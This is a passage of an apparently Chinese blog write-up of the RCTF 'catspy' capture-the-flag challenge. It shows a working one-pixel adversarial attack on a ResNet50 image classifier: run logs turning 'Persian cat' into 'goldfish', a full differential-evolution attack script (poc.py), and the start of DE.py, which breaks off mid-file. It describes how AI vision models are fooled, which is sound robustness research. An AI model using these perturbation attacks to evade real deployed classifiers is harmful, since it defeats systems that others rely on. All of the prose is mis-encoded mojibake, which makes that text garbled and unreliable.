</div></div><p>é€šè¿‡ä»¥ä¸Šå„ä¸ªå‚æ•°çš„è¿­ä»£æ¬¡æ•°å¯è§ï¼Œæ—ç¾¤å¤§å°å¯¹è¿™ä¸ªç®—æ³•çš„æ”¶æ•ˆç”šå¾®ï¼Œåªè¦ä¸æ˜¯å¤ªå°çš„æ—ç¾¤ï¼Œåœ¨ç®—æ³•æ­£ç¡®çš„æƒ…å†µä¸‹ä¸€èˆ¬æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæ¯”å¦‚ä¸Šè¿°çš„ä¸åŒæ—ç¾¤å¤§å°ä¸­ï¼Œ<code>popSize=20</code>æ—¶ä¸¤ä¸‰ç§’å°±å¯ä»¥è¿›è¡Œä¸€æ¬¡è¿­ä»£ï¼Œè€Œ<code>popSize=200</code>æ—¶ä¸€æ¬¡è¿­ä»£å°±è¦å‡ åˆ†é’Ÿï¼Œæ•…è€Œç›²ç›®è¿½æ±‚å¤§æ—ç¾¤æ˜¯å¾—ä¸å¿å¤±çš„ï¼Œä¸å¦‚ç”¨å°æ—ç¾¤å¤šè·‘å‡ é</p><p>ç„¶åæ˜¯è¿™ä¸ªè¾“å‡ºçš„ç»“æœï¼Œæ¯æ¬¡åŸºæœ¬éƒ½æ˜¯åœ¨çŒ«è€³æœµçš„ä½ç½®ä¿®æ”¹åƒç´ ï¼Œå¾—åˆ°goldfishçš„labelï¼Œæ„å‘³ç€Persian Catçš„å†³ç­–èŒƒå›´è¾¹ä¸Šå°±æ˜¯Goldfishï¼Œè€Œä¸”è·ç¦»ä¹‹è¿‘æˆ–è€…è¯´æ¢¯åº¦ä¹‹å¤§åªéœ€è¦ä¸€ä¸ªåƒç´ å°±å¯ä»¥æ‰°åŠ¨æˆåŠŸ</p><p><img src="/images/OnePixelAttackWithDE_Out1.png"></p><h2 id="æ€§èƒ½æ¯”è¾ƒ"><a href="#æ€§èƒ½æ¯”è¾ƒ" class="headerlink" title="æ€§èƒ½æ¯”è¾ƒ"></a>æ€§èƒ½æ¯”è¾ƒ</h2><p>copyäº†ä¸€ä»½è®ºæ–‡linkçš„githubä¸Šçš„<a href="https://github.com/Hyperparticle/one-pixel-attack-keras">ä»£ç </a>ï¼Œè¿›è¡Œäº†ä¸€ä¸‹æ€§èƒ½çš„å¯¹æ¯”ï¼Œè¿™ç§å¸¦è¿æ°”æˆåˆ†çš„ç®—æ³•éœ€è¦å¤§é‡ç»Ÿè®¡æ‰èƒ½åšå‡ºæ¯”è¾ƒï¼Œç›´è§‚æ„Ÿè§‰ä¸Šæ¥è¯´ï¼Œç›¸åŒç§ç¾¤å¤§å°ä¸‹ï¼Œä»–çš„ä¸€æ¬¡è¿­ä»£æ¯”æˆ‘çš„æ…¢å¾—å¤šï¼Œä»–çš„ä»£ç å’Œæˆ‘çš„ä¸€æ ·æœ‰è¿æ°”å¥½å‡ æ¬¡è¿­ä»£ç›´æ¥å‡ºå’Œè¿æ°”å·®è¿­ä»£åŠå¤©ä¸€ç›´ä¸å‡ºçš„æƒ…å†µï¼Œä½†æ˜¯ä»åŸç†ä¸Šè¯´ï¼Œåªè¦ä¸€ç›´æŒ‚ç€è·‘ï¼Œå¤±è´¥äº†è‡ªåŠ¨é‡å¯ç»§ç»­è·‘ï¼Œéƒ½è‚¯å®šå¯ä»¥è·‘å‡ºæ¥çš„</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        popSize=15ï¼ŒmaxIter=100    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0.33761785909882747</span><br><span class="line"></span><br><span class="line">differential_evolution step 1: f(x)&#x3D; 0.177579</span><br><span class="line">Current solution:  [  7.89136557  29.78098292   0.66838417  26.92418736 187.89591321] Current Prediction:  (&#39;Persian cat&#39;, 0.09029071778059006)</span><br><span class="line"></span><br><span class="line">differential_evolution step 2: f(x)&#x3D; 0.177579</span><br><span class="line">Current solution:  [  7.89136557  29.78098292   0.66838417  26.92418736 187.89591321] Current Prediction:  (&#39;Persian cat&#39;, 0.09029071778059006)</span><br><span class="line"></span><br><span class="line">differential_evolution step 3: f(x)&#x3D; 0.177579</span><br><span class="line">Current solution:  [  7.89136557  29.78098292   0.66838417  26.92418736 187.89591321] Current Prediction:  (&#39;Persian cat&#39;, 0.09029071778059006)</span><br><span class="line"></span><br><span class="line">differential_evolution step 4: f(x)&#x3D; 0.177579</span><br><span class="line">Current solution:  [  7.89136557  29.78098292   0.66838417  26.92418736 187.89591321] Current Prediction:  (&#39;Persian cat&#39;, 0.09029071778059006)</span><br><span class="line"></span><br><span class="line">differential_evolution step 5: f(x)&#x3D; 0.164309</span><br><span class="line">Current solution:  [  8.16682606  31.87408249  35.702065    66.00663295 147.64079443] Current Prediction:  (&#39;Persian cat&#39;, 0.07545000314712524)</span><br><span class="line"></span><br><span class="line">differential_evolution step 6: f(x)&#x3D; 0.156934</span><br><span class="line">Current solution:  [  7.63761519  32.62248531  17.25317435   1.4109334  124.63028139] Current Prediction:  (&#39;Persian cat&#39;, 0.07208419591188431)</span><br><span class="line"></span><br><span class="line">differential_evolution step 7: f(x)&#x3D; 0.156934</span><br><span class="line">Current solution:  [  7.63761519  32.62248531  17.25317435   1.4109334  124.63028139] Current Prediction:  (&#39;Persian cat&#39;, 0.07208419591188431) </span><br><span class="line"></span><br><span class="line">differential_evolution step 8: f(x)&#x3D; 0.125927</span><br><span class="line">Solution found:  [ 8.58543511 29.28549154 35.04627611 30.05577958 80.01537897] </span><br><span class="line"></span><br><span class="line">     fun: 0.12592693569604307</span><br><span class="line"> message: &#39;callback function requested stop early by returning True&#39;</span><br><span class="line">    nfev: 681</span><br><span class="line">     nit: 8</span><br><span class="line"> success: False</span><br><span class="line">       x: array([ 8.58543511, 29.28549154, 35.04627611, 30.05577958, 80.01537897])</span><br><span class="line"></span><br><span class="line">(&#39;goldfish&#39;, 0.07302950322628021)</span><br></pre></td></tr></table></figure>    </div></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        poc.py    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torchvision.models <span class="keyword">import</span> resnet50, ResNet50_Weights</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># from DE import differential_evolution</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Differential Evolution Test&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># def fooCallBack(x, convergence):</span></span><br><span class="line"><span class="comment">#     if foo(x) &lt; 5:</span></span><br><span class="line"><span class="comment">#         print(&quot;Solution found: &quot;, x, &quot;\n&quot;)</span></span><br><span class="line"><span class="comment">#         return True</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         print(&quot;Current solution: &quot;, x, &quot;Current fitness: &quot;, foo(x), &quot;\n&quot;)</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def foo(x):</span></span><br><span class="line"><span class="comment">#     if x.ndim == 1:</span></span><br><span class="line"><span class="comment">#         x = np.array([x])</span></span><br><span class="line"><span class="comment">#     return np.sum(np.square(x), axis=1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># solution = differential_evolution(</span></span><br><span class="line"><span class="comment">#     foo, bounds=[(-255, 255), (-255, 255), (-255, 255)], disp=True, callback=fooCallBack)</span></span><br><span class="line"><span class="comment"># print(solution)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;One Pixel Attack&#x27;&#x27;&#x27;</span></span><br><span class="line">weights = ResNet50_Weights.DEFAULT</span><br><span class="line">model = resnet50(weights=weights)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line">preprocess = weights.transforms()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startPath = <span class="string">&#x27;E:/DL/_media_file_task_0dddc5b6-cb34-4468-b20c-abb5d7d0befa/RCTF_catspy/static/start.png&#x27;</span></span><br><span class="line">outPath = <span class="string">&#x27;E:/DL/_media_file_task_0dddc5b6-cb34-4468-b20c-abb5d7d0befa/RCTF_catspy/out.png&#x27;</span></span><br><span class="line">startImg = Image.<span class="built_in">open</span>(startPath).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeOnePixel</span>(<span class="params">img, pert</span>):</span></span><br><span class="line">    img = np.array(img)</span><br><span class="line">    img[<span class="built_in">int</span>(pert[<span class="number">0</span>])][<span class="built_in">int</span>(pert[<span class="number">1</span>])] = pert[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetScore</span>(<span class="params">img</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(img, np.ndarray):</span><br><span class="line">        img = Image.fromarray(img.astype(<span class="string">&#x27;uint8&#x27;</span>)).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    batch = preprocess(img).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    prediction = model(batch).squeeze(<span class="number">0</span>).softmax(<span class="number">0</span>)</span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">143</span>, <span class="number">282</span>, <span class="number">283</span>, <span class="number">284</span>, <span class="number">285</span>, <span class="number">358</span>, <span class="number">383</span>, <span class="number">484</span>]:</span><br><span class="line">        score += prediction[i].item()</span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Predict</span>(<span class="params">img</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(img, np.ndarray):</span><br><span class="line">        img = Image.fromarray(img.astype(<span class="string">&#x27;uint8&#x27;</span>)).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    batch = preprocess(img).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    prediction = model(batch).squeeze(<span class="number">0</span>).softmax(<span class="number">0</span>)</span><br><span class="line">    class_id = prediction.argmax().item()</span><br><span class="line">    score = prediction[class_id].item()</span><br><span class="line">    category_name = weights.meta[<span class="string">&quot;categories&quot;</span>][class_id]</span><br><span class="line">    <span class="keyword">return</span> category_name, score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPertedScore</span>(<span class="params">perts</span>):</span></span><br><span class="line">    <span class="keyword">if</span> perts.ndim == <span class="number">1</span>:</span><br><span class="line">        perts = np.array([perts])</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> pert <span class="keyword">in</span> perts:</span><br><span class="line">        img = ChangeOnePixel(startImg, pert)</span><br><span class="line">        img = Image.fromarray(img.astype(<span class="string">&#x27;uint8&#x27;</span>)).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">        res.append(GetScore(img))</span><br><span class="line">    <span class="keyword">return</span> np.array(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OPACallBack</span>(<span class="params">x, convergence</span>):</span></span><br><span class="line">    prediction = Predict(ChangeOnePixel(startImg, x))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prediction[<span class="number">0</span>]:</span><br><span class="line">        print(<span class="string">&quot;Solution found: &quot;</span>, x, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Current solution: &quot;</span>, x, <span class="string">&quot;Current Prediction: &quot;</span>, prediction, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Solution for Catspy Using Differential Evolution From</span></span><br><span class="line"><span class="string">https://github.com/Hyperparticle/one-pixel-attack-keras/tree/8261f976be922bd9b470040367a34d82fcd506d4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(GetScore(startImg), &quot;\n&quot;)</span></span><br><span class="line"><span class="comment"># solution = differential_evolution(GetPertedScore, bounds=[(0,59), (0,59), (0,255), (0,255), (0,255)], maxiter=100, popsize=15, disp=True, callback=OPACallBack)</span></span><br><span class="line"><span class="comment"># print(solution)</span></span><br><span class="line"><span class="comment"># print(Predict(ChangeOnePixel(startImg, solution.x)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Hand Made Differential Evolution Attack&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OPA</span>(<span class="params">img, pop_size, maxIter, alpha=<span class="number">0.4</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    img: the image to be attacked</span></span><br><span class="line"><span class="string">    pop_size: the size of the population</span></span><br><span class="line"><span class="string">    maxIter: the maximum number of iterations</span></span><br><span class="line"><span class="string">    alpha: the mutation factor, [0.2, 0.6]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">global</span> attackCnt</span><br><span class="line">    attackCnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">        <span class="keyword">global</span> attackCnt</span><br><span class="line">        attackCnt += <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;\n ### Starting DE Attack&quot;</span>, attackCnt, <span class="string">&quot;###\n&quot;</span>)</span><br><span class="line">        <span class="comment"># Step 5.1: Initialize the population</span></span><br><span class="line">        print(<span class="string">&quot;Initializing Differential Evolution&quot;</span>)</span><br><span class="line">        pop = np.concatenate((np.random.randint(<span class="number">0</span>, <span class="number">60</span>, (pop_size, <span class="number">2</span>)), np.random.randint(<span class="number">0</span>, <span class="number">256</span>, (pop_size, <span class="number">3</span>))), axis=<span class="number">1</span>)</span><br><span class="line">        pop = np.array(pop, dtype=np.uint8)</span><br><span class="line">        <span class="comment"># Step 5.2: Initialize the fitness</span></span><br><span class="line">        fitness = np.zeros(pop_size)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pop_size):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">9</span>:</span><br><span class="line">                print(<span class="string">&quot;\rInitializing fitness: &quot;</span>, i+<span class="number">1</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            fitness[i] = GetScore(ChangeOnePixel(img, pop[i]))</span><br><span class="line">        print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="comment"># Step 5.3: Initialize the best fitness</span></span><br><span class="line">        best_fitness = np.<span class="built_in">min</span>(fitness)</span><br><span class="line">        <span class="comment"># Step 5.4: Initialize the best solution</span></span><br><span class="line">        best_solution = pop[fitness.argmin()]</span><br><span class="line">        best_prediction = Predict(ChangeOnePixel(img, best_solution))</span><br><span class="line">        <span class="comment"># Step 5.5: Initialize the iteration</span></span><br><span class="line">        iterCnt = <span class="number">0</span></span><br><span class="line">        noVecChangedCnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> pop, fitness, best_fitness, best_solution, iterCnt, noVecChangedCnt, best_prediction, [], []</span><br><span class="line"></span><br><span class="line">    print(Predict(img))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 5: Differential Evolution Attack</span></span><br><span class="line">    pop, fitness, best_fitness, best_solution, iterCnt, noVecChangedCnt, best_prediction, popHistory, fitnessHistory = init()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> noVecChangedCnt == <span class="number">5</span> <span class="keyword">or</span> iterCnt == maxIter:</span><br><span class="line">            pop, fitness, best_fitness, best_solution, iterCnt, noVecChangedCnt, best_prediction, popHistory, fitnessHistory = init()</span><br><span class="line"></span><br><span class="line">        iterCnt += <span class="number">1</span></span><br><span class="line">        lastPop = np.array(pop)</span><br><span class="line">        popHistory.append(np.array(pop))</span><br><span class="line">        fitnessHistory.append(np.array(fitness))</span><br><span class="line">        changedVec = <span class="number">0</span></span><br><span class="line">        print(<span class="string">&quot; # iter: &quot;</span>, iterCnt, <span class="string">&quot;best fitness: &quot;</span>, best_fitness, <span class="string">&quot;best solution: &quot;</span>, best_solution)</span><br><span class="line">        F = alpha * (np.exp(maxIter / (maxIter + iterCnt)) - <span class="number">1</span>)</span><br><span class="line">        print(<span class="string">&quot;    - F: &quot;</span>, F)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pop_size):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">9</span>:</span><br><span class="line">                print(<span class="string">&quot;\r    - vec: &quot;</span>, i+<span class="number">1</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="comment"># Step 5.5.2: Initialize the mutation vector</span></span><br><span class="line">            mutation = np.random.randint(<span class="number">0</span>, pop_size, <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">while</span> i <span class="keyword">in</span> mutation:</span><br><span class="line">                mutation = np.random.randint(<span class="number">0</span>, pop_size, <span class="number">3</span>)</span><br><span class="line">            <span class="comment"># Step 5.5.3: Initialize the crossover vector</span></span><br><span class="line">            CR = <span class="number">0.25</span> + np.random.rand() * <span class="number">0.5</span></span><br><span class="line">            crossover = np.random.rand(<span class="number">5</span>) &lt; CR</span><br><span class="line">            <span class="comment"># Step 5.5.4: Initialize the trial vector</span></span><br><span class="line">            trial = np.array(lastPop[i] * (<span class="number">1</span> - crossover) + (lastPop[mutation[<span class="number">0</span>]] + F * (lastPop[mutation[<span class="number">1</span>]] - lastPop[mutation[<span class="number">2</span>]])) * crossover, dtype=np.uint8)</span><br><span class="line">            <span class="keyword">for</span> trialIndex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= trial[trialIndex] &lt;= <span class="number">59</span>:</span><br><span class="line">                    trial[trialIndex] = np.random.randint(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">            <span class="keyword">for</span> trialIndex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= trial[trialIndex] &lt;= <span class="number">255</span>:</span><br><span class="line">                    trial[trialIndex] = np.random.randint(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">            <span class="comment"># Step 5.5.5: Update the population</span></span><br><span class="line">            newFitness = GetScore(ChangeOnePixel(img, trial))</span><br><span class="line">            <span class="keyword">if</span> newFitness &lt; fitness[i]:</span><br><span class="line">                pop[i] = np.array(trial, dtype=np.uint8)</span><br><span class="line">                fitness[i] = newFitness</span><br><span class="line">                changedVec += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> changedVec &gt; pop_size * <span class="number">2</span> / <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        print()</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;    - changed vec num: &#x27;</span>, changedVec)</span><br><span class="line">        noVecChangedCnt += <span class="number">1</span> <span class="keyword">if</span> changedVec == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> changedVec != <span class="number">0</span>:</span><br><span class="line">            noVecChangedCnt = <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Step 5.7: Update the best fitness</span></span><br><span class="line">        <span class="keyword">if</span> np.<span class="built_in">min</span>(fitness) &lt; best_fitness:</span><br><span class="line">            best_fitness = np.<span class="built_in">min</span>(fitness)</span><br><span class="line">            best_solution = pop[fitness.argmin()]</span><br><span class="line">            print(<span class="string">&#x27;    ğŸ”µ new best fitness: &#x27;</span>, best_fitness, <span class="string">&#x27; new best solution: &#x27;</span>, best_solution)</span><br><span class="line">            best_prediction = Predict(ChangeOnePixel(img, best_solution))</span><br><span class="line">            print(<span class="string">&#x27;    ğŸ”µ prediction: &#x27;</span>, Predict(ChangeOnePixel(img, best_solution)))</span><br><span class="line">        print(<span class="string">&#x27;    - mean fitness: &#x27;</span>, np.mean(fitness))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> best_prediction[<span class="number">0</span>]:</span><br><span class="line">            print(<span class="string">&quot;\nğŸŸ¢ Holy shit, solution found! Now it&#x27;s a&quot;</span>, best_prediction[<span class="number">0</span>], <span class="string">&quot;with probability&quot;</span>, best_prediction[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> best_solution, popHistory, fitnessHistory</span><br><span class="line"></span><br><span class="line">best_solution, popHistory, fitnessHistory = OPA(startImg, <span class="number">20</span>, <span class="number">200</span>, alpha=<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        DE.py    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 